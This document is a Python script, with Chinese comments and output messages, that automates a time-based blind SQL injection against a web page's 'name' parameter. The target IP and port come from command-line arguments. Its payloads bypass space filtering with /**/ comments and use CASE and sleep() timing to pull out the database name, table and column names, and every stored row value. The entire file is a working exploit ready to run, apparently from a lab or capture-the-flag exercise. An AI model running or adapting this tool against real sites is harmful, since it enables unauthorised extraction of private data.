import socket
import urllib
from urllib import parse
from urllib import request
import sys

def database_len():
    for i in range(1, 10):
        payload = {
            'name':'''lili'/**/&&/**/case/**/length(database())>'''+str(i)+'''/**/when/**/1/**/then/**/1/**/else/**/sleep('''+str(sleep)+''')/**/end/**/&&/**/1='1''',
            'submit':'查询'
        }
        data = parse.urlencode(payload)
        r = request.Request(url+'?'+data)
        try:
            request.urlopen(r,timeout=sleep/2)
        except socket.timeout:
            print('\n'+'数据库名长度：'+str(i))
            return i

def database():
    dbname = ''
    for x in range(1,database_len()+1):
        for i in dictory:
            payload = {
                'name':'''lili'/**/&&/**/case/**/ascii(substr(database()/**/from/**/'''+str(x)+'''/**/for/**/1))>'''+str(ord(i))+'''/**/when/**/1/**/then/**/1/**/else/**/sleep('''+str(sleep)+''')/**/end/**/&&/**/1='1''',
                'submit':'查询'
            }
            data = parse.urlencode(payload)
            r = request.Request(url+'?'+data)
            try:
                request.urlopen(r,timeout=sleep/2)
            except socket.timeout:
                dbname += i
                break
            except urllib.error.URLError:
                try:
                    request.urlopen(r, timeout=sleep/2)
                except socket.timeout:
                    dbname += i
                    break
                except urllib.error.URLError:
                    print('网络异常，请稍后再试')
        print('\n'+dbname)
    return dbname

def table_num():
    for i in range(0, 100):
        payload = {
            'name':'''lili'/**/&&/**/case/**/(select/**/count(*)/**/from/**/information_schema.tables/**/where/**/table_schema=database())>'''+str(i)+'''/**/when/**/1/**/then/**/1/**/else/**/sleep('''+str(sleep)+''')/**/end/**/&&/**/1='1''',
            'submit':'查询'
        }
        data = parse.urlencode(payload)
        r = request.Request(url+'?'+data)
        try:
            request.urlopen(r,timeout=sleep/2)
        except socket.timeout:
            print('\n'+'数据库表数量：'+str(i))
            return i

def table_len():
    table = []
    for i in range(0,table_num()):
        for j in range(1,20):
            payload = {
                'name':'''lili'/**/&&/**/case/**/(select/**/length(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/'''+str(i)+''')>'''+str(j)+'''/**/when/**/1/**/then/**/1/**/else/**/sleep('''+str(sleep)+''')/**/end/**/&&/**/1='1''',
                'submit':'查询'
            }
            data = parse.urlencode(payload)
            r = request.Request(url+'?'+data)
            try:
                request.urlopen(r,timeout=sleep/2)
            except socket.timeout:
                print('\n'+'数据库表'+str(i+1)+'表名长度：'+str(j))
                table.append(j)
                break
    return table

def table_name(table):
    tbname = []
    a = 0
    for x in table:
        name = ''
        for y in range(1,x+1):
            for z in dictory:
                payload = {
                    'name': '''lili'/**/&&/**/case/**/(ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1/**/offset/**/'''+str(a)+''')/**/from/**/'''+str(y)+'''/**/for/**/1)))>'''+str(ord(z))+'''/**/when/**/1/**/then/**/1/**/else/**/sleep('''+str(sleep)+''')/**/end/**/&&/**/1/**/=/**/'1''',
                    'submit': '查询'
                }
                data = parse.urlencode(payload)
                r = request.Request(url + '?' + data)
                try:
                    request.urlopen(r, timeout=sleep / 2)
                except socket.timeout:
                    name += z
                    print('\n' + '数据库表' + str(a + 1) + '表名：' + name)
                    break
        a+=1
        tbname.append(name)
    print(tbname)
    return tbname

#database()
# table_num()
# table_len()
# table_name(table_len())
def list_len():
    listlen = []
    for x in tbname:
        for y in range(1,20):
            payload = {
                'name':'''lili'/**/&&/**/case/**/(select/**/count(*)/**/from/**/information_schema.columns/**/where/**/table_name="'''+str(x)+'''")>'''+str(y)+'''/**/when/**/1/**/then/**/1/**/else/**/sleep('''+str(sleep)+''')/**/end/**/&&/**/1/**/=/**/'1''',
                'submit':'查询'
            }
            data = parse.urlencode(payload)
            r = request.Request(url+'?'+data)
            try:
                request.urlopen(r,timeout=sleep/2)
            except socket.timeout:
                print('\n'+'数据库表['+str(x)+']列数量：'+str(y))
                listlen.append(y)
                break
    return listlen

def list_name_len():
    tbname_length = []
    listdict ={}
    for i,j in listnum.items():
        print(i,j)
        for y in range(0,j):
            for z in range(1,20):
                payload = {
                    'name': '''lili'/**/&&/**/case/**/(select/**/length(column_name)/**/from/**/information_schema.columns/**/where/**/table_name="'''+str(i)+'''"/**/limit/**/1/**/offset/**/'''+str(y)+''')>'''+str(z)+'''/**/when/**/1/**/then/**/1/**/else/**/sleep('''+str(sleep)+''')/**/end/**/&&/**/1/**/=/**/'1''',
                    'submit': '查询'
                }
                data = parse.urlencode(payload)
                r = request.Request(url + '?' + data)
                try:
                    request.urlopen(r, timeout=sleep / 2)
                except socket.timeout:
                    print('\n' + '数据库表' + str(i) + '列：' + str(y+1)+'长度为'+str(z))
                    tbname_length.append(z)
                    break
        listdict[i]=tbname_length
        tbname_length=[]
    print(listdict)
    return listdict

def listname():
    listname = {}
    ln = []
    name = ''
    for i,j in listnamelen.items():
        y = 0
        for x in j:
            for w in range(1,x+1):
                for z in dictorys:
                    payload = {
                         'name': '''lili'/**/&&/**/case/**/(ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name="'''+str(i)+'''"/**/limit/**/1/**/offset/**/'''+str(y)+''')/**/from/**/'''+str(w)+'''/**/for/**/1)))/**/>/**/'''+str(ord(z))+'''/**/when/**/1/**/then/**/1/**/else/**/sleep('''+str(sleep)+''')/**/end/**/&&/**/1/**/='1''',
                         'submit': '查询'
                     }
                    data = parse.urlencode(payload)
                    r = request.Request(url + '?' + data)
                    try:
                        request.urlopen(r, timeout=sleep / 2)
                    except socket.timeout:
                        name += z
                        print('\n' + '数据库表' + str(i) + '列：' + str(y+1) + '列名为' + str(name))
                        # print(payload)
                        break
            y+=1
            ln.append(name)
            name = ''
        listname[i]=ln
        ln = []
    print(listname)
    return listname

def value_num():
    vnum = {}
    for a,b in lname.items():
        for x in range(1,10000):
            payload = {
                'name': '''lili'/**/&&/**/case/**/(select/**/count(*)/**/from/**/'''+str(a)+'''/**/)>'''+str(x)+'''/**/when/**/1/**/then/**/1/**/else/**/sleep(3)/**/end/**/&&/**/1/**/=/**/'1''',
                'submit': '查询'
            }
            data = parse.urlencode(payload)
            r = request.Request(url + '?' + data)
            try:
                request.urlopen(r, timeout=sleep / 2)
            except socket.timeout:
                print('\n' + '数据表' + str(a) + '有'+str(x)+'条数据')
                vnum[a]=x
                break
    print(vnum)
    return vnum

def value():
    val = ''
    dta = {}
    w = {}
    v = []
    for a,b in lname.items(): #a 表名 b 字段列表
        for e in b:           #e 列名
            d = vnum[a]       #vnum 字典{表：字段数量} d 字段数量
            for x in range(0, d): #x 第x个字段
                for y in range(1, 32): #y 值长度
                    payload = {
                        'name': '''lili'/**/&&/**/case/**/(select/**/length(''' + str(e) + ''')/**/from/**/''' + str(a) + '''/**/limit/**/1/**/offset/**/''' + str(x) + ''')>''' + str(y) + '''/**/when/**/1/**/then/**/1/**/else/**/sleep(''' + str(sleep) + ''')/**/end/**/&&/**/1/**/=/**/'1''',
                        'submit': '查询'
                    }
                    data = parse.urlencode(payload)
                    r = request.Request(url + '?' + data)
                    try:
                        request.urlopen(r, timeout=sleep / 2)
                    except socket.timeout:
                        # print('表' + str(a) + '列' + str(e) + '值' + str(x + 1) + '长度为：' + str(y))
                        for i in range(1, y + 1):
                            for j in vdictory:
                                payload = {
                                    'name': '''lili'/**/&&/**/case/**/ascii(substr((select/**/''' + str(e) + '''/**/from/**/''' + str(a) + '''/**/limit/**/1/**/offset/**/''' + str(x) + '''/**/)from/**/''' + str(i) + '''/**/for/**/1))/**/>/**/''' + str(ord(j)) + '''/**/when/**/1/**/then/**/1/**/else/**/sleep(''' + str(sleep) + ''')/**/end/**/&&/**/1/**/=/**/'1''',
                                    'submit': '查询'
                                }
                                data = parse.urlencode(payload)
                                r = request.Request(url + '?' + data)
                                try:
                                    request.urlopen(r, timeout=sleep / 2)
                                except socket.timeout:
                                    val += j
                                    print('值为：' + str(val))
                                    break
                        print('表' + str(a) + '列' + str(e) + '值' + str(x + 1) + '为：' + str(val))
                        v.append(val)
                        # print(v)
                        val = ''
                        break
                w[e]=v
                print(w)
            v=[]
        dta[a]=w
        w={}
    # print(dta)
    return dta

if __name__ == '__main__':
    sleep = 4
    url = '''http://'''
    if len(sys.argv) > 4 or len(sys.argv) < 3:
        print('请输入2~3个参数：IP 端口 页面地址')
        exit(1)
    else:
        if len(sys.argv) < 4:
            url += (sys.argv[1]+':'+sys.argv[2]+'/')
        else:
            url += (sys.argv[1] + ':' + sys.argv[2] + sys.argv[3])
    # # dictorys = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'
    # # vdictory = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'
    # # vdictory = '0123456789abcdefghijklmnopqrstuvwxyz'
    # vdictory = '1238il'
    # # dictorys = 'abcdefghijklmnopqrstuvwxyz'
    # dictorys = 'abcdeimnprsuw'
    # dictory = 'bekmrs'
    dictorys = dictory = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'
    vdictory = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz'
    tbname = table_name(table_len())
    listlen = list_len()
    listnum = dict(zip(tbname,listlen))
    print(listnum)
    listnamelen = list_name_len()
    lname = listname()
    vnum = value_num()
    data_base = value()
    print()
    for tname,lst in data_base.items():
        print(str(tname)+'表：')
        for lname,v in lst.items():
            print(lname+'列：')
            for x in v:
                print(x)